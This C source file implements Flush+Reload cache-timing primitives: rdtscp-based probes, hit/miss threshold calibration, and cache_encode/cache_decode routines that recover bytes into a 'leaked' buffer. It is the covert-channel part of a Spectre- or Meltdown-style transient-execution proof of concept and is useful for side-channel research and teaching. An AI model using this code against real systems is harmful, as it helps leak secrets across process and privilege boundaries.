#include "fr.h"

__attribute__((__always_inline__)) int flush_reload(void *ptr) {
  int junk;
    register uint64_t start = 0, end = 0;
    start = __rdtscp(&junk);
    /* #if USE_RDTSC_BEGIN_END
        start = rdtsc_begin();
    #else
        start = rdtsc();
    #endif */
    //maccess(ptr);
    junk = *(int*)ptr;
    end = __rdtscp(&junk);
    /* #if USE_RDTSC_BEGIN_END
        end = rdtsc_end();
    #else
        end = rdtsc();
    #endif */
    mfence();
    _mm_sfence();
    nospec();

    flush(ptr);

    if (end - start < CACHE_MISS) {
      return 1;
    }
    return 0;
}

// ---------------------------------------------------------------------------
int flush_reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

#if USE_RDTSC_BEGIN_END
  start = rdtsc_begin();
#else
  start = rdtsc();
#endif
  maccess(ptr);
#if USE_RDTSC_BEGIN_END
  end = rdtsc_end();
#else
  end = rdtsc();
#endif

  mfence();
  _mm_sfence();
  nospec();

  flush(ptr);

  return (int)(end - start);
}

// ---------------------------------------------------------------------------
int reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

#if USE_RDTSC_BEGIN_END
  start = rdtsc_begin();
#else
  start = rdtsc();
#endif
  maccess(ptr);
#if USE_RDTSC_BEGIN_END
  end = rdtsc_end();
#else
  end = rdtsc();
#endif
  mfence();
  _mm_sfence();
  nospec();

  return (int)(end - start);
}


// ---------------------------------------------------------------------------
size_t detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

__attribute__((__always_inline__)) void cache_encode(char data) {
  maccess(mem + data * pagesize);
}

// ---------------------------------------------------------------------------
void cache_decode_pretty(char *leaked, int index) {
  for(int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
    if(flush_reload(mem + mix_i * pagesize)) {
      if((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ') {
        leaked[index] = mix_i;
        printf("\x1b[33m%s\x1b[0m\r", leaked);
      }
      fflush(stdout);
      sched_yield();
    }
  }
}

void cache_decode(char *leaked, int index) {
  int mix_i;
  for(int i = 0; i < 256; i++) {
    mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
    if(flush_reload(mem + mix_i * pagesize)) {
      if((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ') {
        leaked[index] = mix_i;
      }
      sched_yield();
    }
  }
}